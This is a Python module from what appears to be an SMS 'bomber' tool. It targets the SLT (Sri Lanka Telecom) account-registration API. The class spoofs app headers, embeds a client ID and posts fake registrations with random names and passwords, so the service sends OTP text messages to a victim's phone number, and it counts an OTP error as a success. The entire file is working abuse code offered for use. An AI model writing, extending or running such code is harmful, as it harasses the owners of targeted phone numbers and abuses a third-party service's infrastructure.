import requests
from core.base import BaseBomber
from core.utils import generate_random_string, generate_random_name

class SLTBomber(BaseBomber):
    def __init__(self, phone_number: str):
        super().__init__(phone_number)
        self.service_name = "SLT"
        self.color = "magenta"
        self.base_url = "https://omniscapp.slt.lk"
        self.session.headers.update({
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://myslt.slt.lk",
            "referer": "https://myslt.slt.lk/",
            "x-ibm-client-id": "b7402e9d66808f762ccedbe42c20668e",
        })

    def send_one(self) -> bool:
        formatted_phone = f"0{self.clean_number}"
        password = generate_random_string(12)
        
        payload = {
            "userName": formatted_phone,
            "password": password,
            "Name": generate_random_name(),
            "userType": "MOBILE",
            "firebaseId": generate_random_string(9),
            "appVersion": "1.0",
            "osType": "iOS",
            "confirmPassword": password,
        }
        
        url = f"{self.base_url}/slt/ext/api/Account/RegisterV2"
        
        try:
            response = self.session.post(url, data=payload, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get('isSuccess', False) or 'OTP' in data.get('errorMessege', '')
            return False
        except Exception:
            return False
